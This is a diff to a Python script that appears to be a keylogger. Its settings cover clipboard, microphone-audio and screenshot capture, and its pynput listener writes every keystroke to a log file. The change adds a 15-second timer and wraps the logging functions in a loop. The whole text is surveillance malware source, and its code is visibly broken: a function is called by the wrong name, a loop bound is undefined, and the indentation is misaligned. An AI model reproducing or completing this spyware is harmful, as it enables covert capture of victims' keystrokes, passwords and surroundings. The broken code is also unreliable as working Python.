@@ -42,6 +42,7 @@ clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenschot.png"
 recorded_microphone_time = 10
+time_iteration = 15 # time in seconds
 
 file_path = "Directory where you want to save the file of log"
 extend = "\\"
@@ -139,7 +140,13 @@ def ScreenShot():
         
 ScreenShot()
         
-            
+# Setting the timer
+number_of_iterations = 0
+current_Time = time.time()
+Stopping_Time = time.time() + time_iteration
+
+
+
     
     
     
@@ -148,43 +155,44 @@ ScreenShot()
     
     
 
-# Constant
-key_count =0
-# Empty list
-keys = []
+while number_of_iterations < number_of_iterations_end:
+     # Constant
+    key_count =0
+    # Empty list
+    keys = []
 
-def on_press(key):
-    global keys, key_count
-    
-    print(key)
-    keys.append(key)
-    key_count += 1
-    
-    if key_count >= 1:
-        key_count = 0
-        write_file(keys)
-        keys = []
-        
-    
-def write_to_file(keys):
-    with open(file_path + extend + keys_information, "a") as file:
-        for key in keys:
-            adding_each_keystroke_to_word = str(key).replace("'","")
-            if adding_each_keystroke_to_word.find("space") > 0 :
-                file.write('\n')
-                file.close()
-                
-             elif adding_each_keystroke_to_word.find("key") == -1:
-                file.write(adding_each_keystroke_to_word)
-                file.close()
-                
- def  on_release(key):
-    if key == key.esc:
-        return False
-    
- with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-    
+    def on_press(key):
+        global keys, key_count
+
+        print(key)
+        keys.append(key)
+        key_count += 1
+
+        if key_count >= 1:
+            key_count = 0
+            write_file(keys)
+            keys = []
+
+
+    def write_to_file(keys):
+        with open(file_path + extend + keys_information, "a") as file:
+            for key in keys:
+                adding_each_keystroke_to_word = str(key).replace("'","")
+                if adding_each_keystroke_to_word.find("space") > 0 :
+                    file.write('\n')
+                    file.close()
+
+                 elif adding_each_keystroke_to_word.find("key") == -1:
+                    file.write(adding_each_keystroke_to_word)
+                    file.close()
+
+     def  on_release(key):
+        if key == key.esc:
+            return False
+
+     with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
                 
                 
             
